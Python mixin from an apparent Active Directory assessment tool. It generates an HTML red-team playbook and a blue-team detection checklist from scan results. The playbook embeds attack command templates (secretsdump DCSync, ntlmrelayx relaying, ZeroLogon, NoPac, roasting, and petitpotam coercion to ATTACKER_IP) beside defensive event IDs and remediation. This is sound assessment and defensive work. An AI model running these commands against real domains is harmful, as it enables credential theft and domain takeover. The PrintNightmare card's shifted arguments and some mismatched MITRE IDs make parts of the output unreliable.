"""
Mixin for Red Team Playbook and Blue Team Checklist generation.
"""

import html as html_stdlib
import logging



class PurpleTeamMixin:
    """Mixin for Red Team Playbook and Blue Team Checklist generation."""

    def _red_card(self, title, objective, prerequisites, procedure_code, tools, mitre_id, detection_note, affected_list=''):
        """Build a single Red Team playbook card with full structure."""
        aff = f'<p class="mb-1 small"><strong>Affected targets (from scan):</strong> <code>{html_stdlib.escape(affected_list)}</code></p>' if affected_list else ''
        return f"""
                <div class="card border-danger mb-3">
                    <div class="card-header bg-danger bg-opacity-10 py-2">
                        <strong>{html_stdlib.escape(title)}</strong>
                        <span class="badge bg-secondary ms-2">{html_stdlib.escape(mitre_id)}</span>
                    </div>
                    <div class="card-body small">
                        <p class="mb-1"><strong>Objective:</strong> {html_stdlib.escape(objective)}</p>
                        <p class="mb-1"><strong>Prerequisites:</strong> {html_stdlib.escape(prerequisites)}</p>
                        {aff}
                        <p class="mb-1 mt-2"><strong>Procedure:</strong></p>
                        <pre class="bg-dark text-light p-2 rounded small mb-2"><code>{html_stdlib.escape(procedure_code)}</code></pre>
                        <p class="mb-1"><strong>Tools:</strong> {html_stdlib.escape(tools)}</p>
                        <p class="mb-0 text-muted"><strong>Detection note:</strong> {html_stdlib.escape(detection_note)}</p>
                    </div>
                </div>"""

    def _blue_row(self, finding, event_ids, affected, detection, response, remediation):
        """Build a single Blue Team checklist row with detection, response, remediation."""
        return f"""<tr>
            <td class="align-top">{html_stdlib.escape(finding)}</td>
            <td class="align-top"><code class="small">{html_stdlib.escape(event_ids)}</code></td>
            <td class="align-top small">{html_stdlib.escape(affected)}</td>
            <td class="align-top small">{html_stdlib.escape(detection)}</td>
            <td class="align-top small">{html_stdlib.escape(response)}</td>
            <td class="align-top small">{html_stdlib.escape(remediation)}</td>
        </tr>"""

    def _generate_purple_team_section(self, risks, domain=None, dc_ip=None, kerberoasting_risks=None, asrep_risks=None, dcsync_risks=None, nopac_risks=None, domain_security_risks=None, kerberoasting_targets=None, asrep_targets=None, privileged_account_risks=None, gpp_risks=None, extended_ldap_risks=None):
        """Generate Red Team Playbook and Blue Team Checklist with concrete data, full scenarios, and remediation."""
        domain = domain or 'DOMAIN'
        dc_ip = dc_ip or 'DC_IP'
        kerberoasting_risks = kerberoasting_risks or []
        asrep_risks = asrep_risks or []
        dcsync_risks = dcsync_risks or []
        nopac_risks = nopac_risks or []
        domain_security_risks = domain_security_risks or []
        privileged_account_risks = privileged_account_risks or []
        gpp_risks = gpp_risks or []
        kerberoasting_targets = kerberoasting_targets or []
        asrep_targets = asrep_targets or []
        extended_ldap_risks = extended_ldap_risks or []
    
        # --- Red Team Playbook: concrete commands with actual targets ---
        red_team_items = []
    
        # AS-REP Roasting - concrete commands
        asrep_users = set()
        for r in asrep_risks:
            obj = r.get('affected_object') or r.get('affected_objects', [])
            if isinstance(obj, str):
                asrep_users.add(obj)
            elif isinstance(obj, list):
                asrep_users.update(obj)
        for t in asrep_targets:
            u = t.get('username') or t.get('sAMAccountName')
            if u:
                asrep_users.add(u)
        if asrep_users:
            user_list = ', '.join(sorted(asrep_users)[:8])
            if len(asrep_users) > 8:
                user_list += f' (+{len(asrep_users) - 8} more)'
            red_team_items.append(self._red_card(
                'AS-REP Roasting',
                'Obtain crackable TGT hashes for accounts that do not require Kerberos pre-authentication, then offline crack to obtain plaintext password.',
                'Network access to DC (LDAP/Kerberos), no credentials required for AS-REP request.',
                f"GetNPUsers.py {domain}/USER -no-pass -dc-ip {dc_ip}\nRubeus.exe asreproast /user:USER /format:hashcat",
                'Impacket (GetNPUsers), Rubeus, Hashcat.',
                'T1558.001',
                'Monitor 4768 (Kerberos TGT request) with Result=0x0 (success) without corresponding preauth; baseline AS-REP requests for service accounts.',
                user_list
            ))
    
        # Kerberoasting - concrete commands
        kerb_users = set()
        for r in kerberoasting_risks:
            obj = r.get('affected_object') or (r.get('affected_objects', []) if isinstance(r.get('affected_objects'), list) else [])
            if isinstance(obj, str):
                kerb_users.add(obj)
            elif isinstance(obj, list):
                kerb_users.update(obj)
        for t in kerberoasting_targets:
            u = t.get('username') or t.get('sAMAccountName')
            if u:
                kerb_users.add(u)
        if kerb_users:
            user_list = ', '.join(sorted(kerb_users)[:8])
            if len(kerb_users) > 8:
                user_list += f' (+{len(kerb_users) - 8} more)'
            red_team_items.append(self._red_card(
                'Kerberoasting',
                'Request TGS tickets for SPN accounts; extract crackable hashes and offline crack to obtain service account passwords.',
                'Valid domain user credentials; target accounts must have SPNs registered.',
                f"GetUserSPNs.py {domain}/USER:PASSWORD -dc-ip {dc_ip} -request\nRubeus.exe kerberoast",
                'Impacket (GetUserSPNs), Rubeus, Hashcat.',
                'T1558.003',
                'Monitor 4769 (TGS request) for high-value SPNs; alert on repeated TGS requests for same account from same source (Kerberoasting pattern).',
                user_list
            ))
    
        # RBCD (Resource-based Constrained Delegation)
        rbcd_risks = [r for r in extended_ldap_risks if r.get('type') == 'rbcd_delegation']
        if rbcd_risks:
            rbcd_targets = [r.get('affected_object') for r in rbcd_risks if r.get('affected_object')]
            if rbcd_targets:
                rbcd_list = ', '.join(rbcd_targets[:6])
                red_team_items.append(self._red_card(
                    'RBCD (Resource-Based Constrained Delegation)',
                    'Abuse delegation configured on a computer account to obtain a ticket impersonating a high-privilege user (e.g. Domain Admin).',
                    'NTLM hash or password of the computer account that has RBCD; or write permission to add delegation to the target.',
                    "# If you have Write on msDS-AllowedToActOnBehalfOfOtherIdentity, add SELF or controlled account\nRubeus.exe s4u /user:TARGET$ /rc4:HASH /impersonateuser:administrator",
                    'Rubeus, Impacket (addspn, getST), Powermad.',
                    'T1558.002',
                    'Monitor 4769 (S4U2Self/S4U2Proxy); alert when non-DC computer requests ticket with impersonation for privileged account.',
                    rbcd_list
                ))
    
        # DCSync
        dcsync_accounts = set()
        for r in dcsync_risks:
            obj = r.get('affected_object') or (r.get('affected_objects', []) if isinstance(r.get('affected_objects'), list) else [])
            if isinstance(obj, str):
                dcsync_accounts.add(obj)
            elif isinstance(obj, list):
                dcsync_accounts.update(obj)
        if dcsync_accounts:
            acc_list = ', '.join(sorted(dcsync_accounts)[:6])
            red_team_items.append(self._red_card(
                'DCSync (Credential Dumping via Replication)',
                'Abuse replication rights to retrieve NTLM hashes and Kerberos keys for all domain accounts from the DC without loading LSASS.',
                'Compromised account with Replicating Directory Changes / Replicating Directory Changes All (DCSync) rights.',
                f"secretsdump.py {domain}/ACCOUNT:PASSWORD@{dc_ip}",
                'Impacket secretsdump, Mimikatz (lsadump::dcsync).',
                'T1003.006',
                'Correlate 4662 (AD DS replication) with non-DC source IPs; alert on replication requests from non-DC computers.',
                acc_list
            ))
    
        # NoPac
        nopac_computers = set()
        for r in nopac_risks:
            obj = r.get('affected_object') or (r.get('affected_objects', []) if isinstance(r.get('affected_objects'), list) else [])
            if isinstance(obj, str):
                nopac_computers.add(obj)
            elif isinstance(obj, list):
                nopac_computers.update(obj)
        if nopac_computers:
            comp_list = ', '.join(sorted(nopac_computers)[:5])
            red_team_items.append(self._red_card(
                'NoPac (CVE-2021-42278 / CVE-2021-42287)',
                'Exploit PAC validation and machine account name handling to impersonate Domain Admin without Kerberos delegation.',
                'Valid domain user; target DC must be unpatched for CVE-2021-42278/42287.',
                f"noPac.py {domain}/user:password -dc-ip {dc_ip} -impersonate administrator",
                'noPac (Impacket-based), Python.',
                'T1558.001, T1078',
                'Monitor 4769 (TGT/TGS) and 4624 for DC; look for machine account name anomalies and privilege escalation from standard user to DA.',
                comp_list
            ))
    
        # Domain Security (LDAP/SMB relay)
        relay_types = [r.get('type') for r in domain_security_risks]
        if relay_types:
            ldap_relay = 'ldap_signing_disabled' in relay_types
            smb_relay = 'smb_signing_disabled' in relay_types
            cmds = []
            if ldap_relay:
                cmds.append(f"ntlmrelayx.py -t ldap://{html_stdlib.escape(dc_ip)} -smb2support")
            if smb_relay:
                cmds.append(f"ntlmrelayx.py -t smb://{html_stdlib.escape(dc_ip)} -smb2support")
            if cmds:
                proc = "Responder or PetitPotam to coerce victim then ntlmrelayx to relay NTLM to DC:\n" + "\n".join(cmds)
                red_team_items.append(self._red_card(
                    'NTLM Relay (LDAP/SMB Signing Disabled)',
                    'Relay NTLM authentication from a victim to the DC to add backdoor users, DCSync rights, or dump hashes when LDAP/SMB signing is not required.',
                    'Network position to capture NTLM (e.g. Responder, PetitPotam); DC must not require signing for LDAP/SMB.',
                    proc,
                    'ntlmrelayx (Impacket), Responder, PetitPotam.',
                    'T1557.001',
                    'Detect NTLM authentication (4624) to DC from unexpected sources; require LDAP signing and SMB signing to prevent relay.',
                    'DC / Domain'
                ))
    
        if gpp_risks:
            red_team_items.append(self._red_card(
                'GPP Password Extraction',
                'Retrieve and decrypt passwords stored in Group Policy Preferences (SYSVOL) to gain additional credentials.',
                'Domain user with read access to SYSVOL (default for authenticated users).',
                f"smbclient //{dc_ip}/SYSVOL -U domain/user\nGet-GPPPassword.ps1 / Get-GPPPasswords.ps1",
                'Impacket, PowerSploit Get-GPPPassword, gpp-decrypt.',
                'T1552.006',
                'Audit 5145 (network share access) and 4663 (file access) to SYSVOL; monitor for access to Groups.xml and scripts with cpassword.',
                'SYSVOL'
            ))
    
        zerologon_risks_rt = [r for r in risks if 'zerologon' in r.get('type', '').lower()]
        if zerologon_risks_rt:
            red_team_items.append(self._red_card(
                'ZeroLogon (CVE-2020-1472)',
                'Set DC computer account password to empty via Netlogon RPC, then dump secrets and restore or persist.',
                'Network access to DC on 445 (Netlogon); vulnerable DC (pre-patch).',
                f"zerologon_tester.py DC_NAME {dc_ip}\nsecretsdump.py -no-pass DC_NAME$@{dc_ip}",
                'Impacket (secretsdump), ZeroLogon exploit scripts.',
                'T1558.001',
                'Monitor 4742 (computer account password change) and Netlogon 445 from non-DC; alert on DC password reset.',
                'DC(s)'
            ))
    
        printnightmare_risks_rt = [r for r in risks if 'printnightmare' in r.get('type', '').lower()]
        if printnightmare_risks_rt:
            red_team_items.append(self._red_card(
                'PrintNightmare (CVE-2021-1675 / CVE-2021-34527)',
                'Load arbitrary DLL via Windows Print Spooler to achieve RCE or privilege escalation on target (including DC).',
                'Network access to target; Print Spooler enabled on target.',
                'Invoke-Nightmare / CVE-2021-1675.ps1 or Metasploit exploit; coerce to DC if relay is possible.',
                'T1547.012',
                'Monitor 7045 (service install), 4697 (service install), and Spooler service start; restrict Spooler on DCs and critical servers.',
                'Systems with Spooler'
            ))
    
        petitpotam_risks_rt = [r for r in risks if 'petitpotam' in r.get('type', '').lower()]
        if petitpotam_risks_rt:
            red_team_items.append(self._red_card(
                'PetitPotam (MS-EFSRPC Coercion)',
                'Coerce a victim host (e.g. DC) to authenticate to attacker-controlled NTLM relay to capture hashes or relay to DC.',
                'Network access to victim; EFS RPC (MS-EFSR) available; NTLM relay target (e.g. LDAP on DC without signing).',
                f"petitpotam.py -u USER -p PASS {dc_ip} ATTACKER_IP",
                'PetitPotam, ntlmrelayx.',
                'T1557.001',
                'Monitor 4624 (NTLM logon) from DC or high-value hosts to unexpected IPs; block MS-EFSR from untrusted clients.',
                'DC / File servers'
            ))
    
        shadow_cred_risks_rt = [r for r in risks if 'shadow' in r.get('type', '').lower() and 'credential' in r.get('type', '').lower()]
        if shadow_cred_risks_rt:
            red_team_items.append(self._red_card(
                'Shadow Credentials (Key Credential Link)',
                'Add key credential to target account via ESC1/ESC3 or Write permission, then PKINIT to get TGT as that account.',
                'Write to target object (msDS-KeyCredentialLink) or abuse AD CS; certificate authority for PKINIT.',
                "Whisker.exe add /target:TARGET$\nRubeus.exe asktgt /user:TARGET$ /certificate:BASE64 /password:xxx",
                'Whisker (SharpWhisker), Rubeus, Certipy.',
                'T1558.001',
                'Monitor 5136 (directory service changes) for msDS-KeyCredentialLink; alert on key credential add to privileged accounts.',
                'Privileged / target accounts'
            ))
    
        unconstrained_risks = [r for r in risks if 'unconstrained' in r.get('type', '').lower() or r.get('type') == 'unconstrained_delegation']
        if unconstrained_risks:
            red_team_items.append(self._red_card(
                'Unconstrained Delegation Abuse',
                'Compromise a host with unconstrained delegation to capture TGTs of users (e.g. DA) connecting to that host, then reuse.',
                'Compromised computer or service account with TrustedForDelegation=True; victim (e.g. DA) must connect to that host.',
                'Rubeus.exe monitor /interval:5  (on delegation host)\nRubeus.exe ptt /ticket:BASE64_TGT',
                'Rubeus, Mimikatz (sekurlsa::tickets).',
                'T1558.001',
                'Monitor 4769 (TGS) and 4624 for unconstrained delegation accounts; alert when high-privilege accounts authenticate to delegation systems.',
                'Delegation hosts'
            ))
    
        if privileged_account_risks:
            priv_count = len(privileged_account_risks)
            red_team_items.append(f"""
                <div class="card border-warning mb-3">
                    <div class="card-header bg-warning bg-opacity-25 py-2"><strong>Privileged Account Targeting</strong></div>
                    <div class="card-body small">
                        <p class="mb-1"><strong>Objective:</strong> Prioritize credential theft and lateral movement toward Domain Admins / Enterprise Admins.</p>
                        <p class="mb-1"><strong>Prerequisites:</strong> Initial access (phishing, vuln, or stolen low-privilege creds).</p>
                        <p class="mb-0"><strong>Affected (from scan):</strong> {priv_count} privileged/high-value accounts. Use Kerberoasting, AS-REP, DCSync, or GPO abuse paths from this report.</p>
                    </div>
                </div>""")
    
        if not red_team_items:
            critical = [r for r in risks if (r.get('severity') or r.get('severity_level') or '').lower() == 'critical'][:3]
            for r in critical:
                scenario = (r.get('attack_scenario') or r.get('description') or '')[:200]
                red_team_items.append(f"""
                <div class="card border-danger mb-2">
                    <div class="card-body py-2">
                        <strong>{html_stdlib.escape(r.get('title', 'Risk'))}</strong>
                        <p class="mb-1 small">{html_stdlib.escape(scenario)}</p>
                    </div>
                </div>""")
            if not red_team_items:
                red_team_items = ['<p class="text-muted">No exploitable findings for playbook. Run full scan with domain/DC context.</p>']
    
        red_html = ''.join(red_team_items)
    
        # --- Blue Team Checklist: per-finding Detection, Response, Remediation ---
        blue_rows = []
    
        def _blue(finding, event_ids, affected, detection, response, remediation):
            blue_rows.append(self._blue_row(finding, event_ids, affected, detection, response, remediation))
    
        if asrep_users or asrep_targets:
            users_str = ', '.join(sorted(asrep_users)[:8]) if asrep_users else 'See report'
            _blue('AS-REP Roasting (TGT without preauth)', '4768 (Kerberos TGT); filter Result=0x0', users_str,
                'SIEM: Alert on 4768 where Pre-Authentication required = false and Result=0x0. Baseline service accounts that legitimately use no preauth.',
                'Isolate source host; force password change for affected users; enable Kerberos preauth for accounts that do not require it.',
                'Enable "Require Kerberos preauthentication" on all user accounts except dedicated accounts that require it (document and monitor).')
    
        if kerb_users or kerberoasting_targets:
            users_str = ', '.join(sorted(kerb_users)[:8]) if kerb_users else 'SPN accounts'
            _blue('Kerberoasting (TGS requests for offline crack)', '4769 (TGS), 4624 (Logon)', users_str,
                'Alert on high volume of TGS requests (4769) for high-value SPNs from same source; correlate with 4624 logon type 3.',
                'Investigate source account and host; rotate passwords for targeted SPN accounts; block suspicious source if malicious.',
                'Use managed service accounts (gMSA) where possible; strong passwords for SPN accounts; consider Tiering and restrict where TGS can be requested.')
    
        if dcsync_accounts:
            acc_str = ', '.join(sorted(dcsync_accounts)[:6])
            _blue('DCSync / Replication abuse', '4662 (AD DS replication); Source=ntds', acc_str,
                'Alert on 4662 where requesting host is not a DC; correlate with replication traffic from non-DC IPs.',
                'Revoke DCSync rights from compromised account immediately; rotate its password; investigate how account was compromised.',
                'Limit Replicating Directory Changes / Replicating Directory Changes All to dedicated DR accounts and DCs only; audit regularly.')
    
        if nopac_computers:
            comp_str = ', '.join(sorted(nopac_computers)[:5])
            _blue('NoPac (CVE-2021-42278/42287) exploitation', '4769, 4624, 4672 (Privilege use)', comp_str,
                'Monitor 4769 and 4624 on DCs for machine account name anomalies and privilege escalation from standard user to DA.',
                'Patch all DCs (KB5008602+); isolate and investigate any host that attempted exploitation; rotate DA credentials if suspected compromise.',
                'Apply Microsoft patches for CVE-2021-42278 and CVE-2021-42287 to all domain controllers; verify patch level.')
    
        if domain_security_risks:
            _blue('NTLM Relay (LDAP/SMB signing disabled)', '4624 (NTLM), 4648 (Explicit credentials)', 'DC / Domain',
                'Detect NTLM authentication to DC from unexpected sources; correlate with relay tool signatures (e.g. ntlmrelayx).',
                'Enable LDAP signing and SMB signing on DCs; block or restrict NTLM where possible; investigate relay source.',
                'Enable "Domain controller: LDAP server signing requirements" and "Microsoft network server: Digitally sign communications (always)"; restrict NTLM via GPO.')
    
        if gpp_risks:
            _blue('GPP password exposure in SYSVOL', '5145 (Network share), 4663 (File access to SYSVOL)', 'SYSVOL',
                'Audit access to SYSVOL; alert on read access to Groups.xml, scripts.xml and files containing cpassword.',
                'Remove cpassword from GPP XML files (use GPPrefPassword or migrate to modern secrets); rotate any exposed passwords.',
                'Remove all Group Policy Preferences that store passwords; use Group Managed Service Accounts, LAPS, or a secrets manager instead.')
    
        rbcd_risks_bt = [r for r in extended_ldap_risks if r.get('type') == 'rbcd_delegation']
        if rbcd_risks_bt:
            rbcd_targets_str = ', '.join([r.get('affected_object') for r in rbcd_risks_bt if r.get('affected_object')][:5])
            _blue('RBCD (Resource-based constrained delegation) abuse', '4769 (S4U2Self, S4U2Proxy), 4624', rbcd_targets_str,
                'Alert on 4769 where service ticket is requested with impersonation (S4U2Self/S4U2Proxy) for privileged accounts from non-DC.',
                'Review msDS-AllowedToActOnBehalfOfOtherIdentity on affected objects; remove unauthorized delegation; rotate compromised computer account.',
                'Audit RBCD on all computer accounts; allow only necessary delegation; use constrained delegation with protocol transition where possible.')
    
        zerologon_risks = [r for r in risks if 'zerologon' in r.get('type', '').lower()]
        if zerologon_risks:
            _blue('ZeroLogon (CVE-2020-1472)', '4742 (Computer account password change), Netlogon 445', 'DC(s)',
                'Alert on 4742 (computer account password change) for DC; monitor Netlogon from non-DC sources.',
                'Patch DC immediately (KB4557222+); restore DC from backup if compromised; reset DC computer account and re-secure.',
                'Apply MS patch for CVE-2020-1472; enforce Netlogon secure RPC (RequireSignOrSeal, RequireStrongKey); verify no vulnerable DCs.')
    
        printnightmare_risks = [r for r in risks if 'printnightmare' in r.get('type', '').lower()]
        if printnightmare_risks:
            _blue('PrintNightmare (CVE-2021-1675/34527)', '7045 (Service install), 4697, Spooler service', 'Systems with Spooler',
                'Alert on 7045/4697 (service install) and Spooler-related events on critical hosts; monitor for remote DLL load.',
                'Disable Print Spooler on DCs and non-print servers; patch all systems; investigate and isolate compromised hosts.',
                'Disable "Print Spooler" on Domain Controllers and servers that do not need printing; apply Microsoft patches.')
    
        petitpotam_risks = [r for r in risks if 'petitpotam' in r.get('type', '').lower()]
        if petitpotam_risks:
            _blue('PetitPotam / MS-EFSR coercion', '4624 (NTLM from DC or file server to relay)', 'DC / File servers',
                'Monitor 4624 (NTLM logon) where source is DC or high-value server and target is unexpected IP (relay).',
                'Block EFS RPC from untrusted clients; enable SMB/LDAP signing; investigate coercion source.',
                'Restrict MS-EFSR (PetitPotam) to trusted clients only; disable EFS RPC on DCs if not required; require signing.')
    
        shadow_cred_risks = [r for r in risks if 'shadow' in r.get('type', '').lower() and 'credential' in r.get('type', '').lower()]
        if shadow_cred_risks:
            _blue('Shadow Credentials (Key Credential Link)', '5136 (Directory service change), 4769 (PKINIT)', 'Privileged / target accounts',
                'Alert on 5136 (DS change) where attribute msDS-KeyCredentialLink is added; monitor PKINIT (4769) for sensitive accounts.',
                'Remove unauthorized key credentials from object; rotate account credentials; investigate write permission abuse or ESC.',
                'Restrict who can write msDS-KeyCredentialLink; harden AD CS (ESC scenarios); use Tiering and PAM.')
    
        laps_risks = [r for r in risks if 'laps' in r.get('type', '').lower()]
        if laps_risks:
            _blue('LAPS misconfiguration or exposure', '4662 (AD replication), 4624, 4688 (Process)', 'Computers with LAPS',
                'Monitor replication and process access targeting ms-Mcs-AdmPwd; alert on LAPS password read from non-admin workstations.',
                'Rotate LAPS passwords for affected computers; restrict LAPS read to authorized helpdesk/SIEM; remove excessive LAPS permissions.',
                'Deploy LAPS correctly; limit "Read LAPS password" to least-privilege OUs and roles; audit LAPS ACLs regularly.')
    
        trust_risks = [r for r in risks if 'trust' in r.get('type', '').lower()]
        if trust_risks:
            _blue('Trust relationship abuse (cross-domain)', '4624 (Logon), 4648, 4672', 'Trust accounts / trusted domains',
                'Monitor logons (4624) from trusted domain accounts to sensitive resources; alert on SID history or trust abuse patterns.',
                'Review trust configuration; disable unnecessary trusts; restrict trust authentication to specific resources.',
                'Minimize trust scope; use selective authentication; document and monitor trust usage; consider forest trust instead of external where possible.')
    
        cert_risks = [r for r in risks if 'certificate' in r.get('type', '').lower() or 'esc' in r.get('type', '').lower()]
        if cert_risks:
            _blue('AD CS / Certificate abuse (e.g. ESC)', '4886/4887 (Certification Authority), 4624', 'CA / Templates',
                'Monitor CA audit logs for unusual certificate issuance; alert on cert requests for DA or sensitive templates.',
                'Revoke suspicious certificates; restrict template permissions; investigate ESC or enrollment abuse.',
                'Harden AD CS: disable vulnerable templates; restrict enrollment rights; enable CA logging; follow ESC mitigation guide.')
    
        _blue('GPO changes (unauthorized)', '5136, 5137, 5141 (Directory service / GPO)', 'Domain / OUs',
            'Audit GPO create/modify/delete; alert on GPO changes outside change window or by non-authorized accounts.',
            'Revert unauthorized GPO changes; investigate who made change; revoke credentials if compromised.',
            'Implement change control for GPO; limit GPO edit to dedicated admin accounts; enable GPO versioning and backup.')
        _blue('Privileged group membership changes', '4728, 4729, 4732, 4733 (Security group change)', 'Domain Admins, Enterprise Admins, etc.',
            'Alert on any add/remove to Domain Admins, Enterprise Admins, Schema Admins; correlate with 4648/4624.',
            'Immediately remove unauthorized member; rotate credentials of affected accounts; investigate how membership was changed.',
            'Use Tiering; restrict who can modify privileged groups; use PAM for just-in-time access; regular membership reviews.')
        _blue('Sensitive privilege use', '4672 (Admin right), 4673 (Sensitive privilege)', 'Privileged accounts',
            'Alert on 4672/4673 from non-dedicated admin workstations or outside maintenance windows.',
            'Investigate process and user; revoke privilege if abuse; contain host if malicious.',
            'Limit sensitive privileges; use PAW and jump boxes; monitor all privilege use.')
        _blue('Account lockout / failed logon (brute force)', '4625 (Failed logon), 4771 (Pre-auth failure)', 'All accounts',
            'Alert on high count of 4625/4771 from same source or for same account; correlate with 4768 (Kerberos) failures.',
            'Block source IP/account; force password reset if account targeted; investigate for credential stuffing or spray.',
            'Enable lockout policy; use MFA; monitor and tune thresholds; protect high-value accounts with additional controls.')
    
        blue_html = ''.join(blue_rows)
    
        red_team_playbook_html = f"""
        <nav aria-label="breadcrumb" class="mb-4">
            <ol class="breadcrumb">
                <li class="breadcrumb-item"><a href="#dashboard" onclick="if(typeof window.navigateToTab !== 'undefined'){{window.navigateToTab('dashboard-tab');}}">Dashboard</a></li>
                <li class="breadcrumb-item active">Red Team Playbook</li>
            </ol>
        </nav>
        <div class="row">
            <div class="col-12">
                <p class="text-muted small mb-3">Domain: <code>{html_stdlib.escape(domain)}</code> | DC: <code>{html_stdlib.escape(dc_ip)}</code>. Use only in authorized engagements.</p>
            </div>
            <div class="col-12">
                <div class="card border-danger">
                    <div class="card-header bg-danger text-white">
                        <i class="fas fa-skull-crossbones"></i> Red Team Playbook
                    </div>
                    <div class="card-body">
                        <div style="max-height: none; overflow-y: auto;">{red_html}</div>
                    </div>
                </div>
            </div>
        </div>
        """
    
        blue_team_checklists_html = f"""
        <nav aria-label="breadcrumb" class="mb-4">
            <ol class="breadcrumb">
                <li class="breadcrumb-item"><a href="#dashboard" onclick="if(typeof window.navigateToTab !== 'undefined'){{window.navigateToTab('dashboard-tab');}}">Dashboard</a></li>
                <li class="breadcrumb-item active">Blue Team Checklists</li>
            </ol>
        </nav>
        <div class="row">
            <div class="col-12">
                <p class="text-muted small mb-3">Per-finding: Event IDs, Detection/SIEM, Response actions, Remediation.</p>
            </div>
            <div class="col-12">
                <div class="card border-info">
                    <div class="card-header bg-info text-white">
                        <i class="fas fa-shield-alt"></i> Blue Team Checklists
                    </div>
                    <div class="card-body">
                        <div style="overflow-x: auto; overflow-y: auto;">
                        <table class="table table-sm table-bordered">
                            <thead class="table-light">
                                <tr>
                                    <th>Finding</th>
                                    <th>Event IDs</th>
                                    <th>Affected</th>
                                    <th>Detection / SIEM</th>
                                    <th>Response</th>
                                    <th>Remediation</th>
                                </tr>
                            </thead>
                            <tbody>{blue_html}</tbody>
                        </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        """
    
        return red_team_playbook_html, blue_team_checklists_html
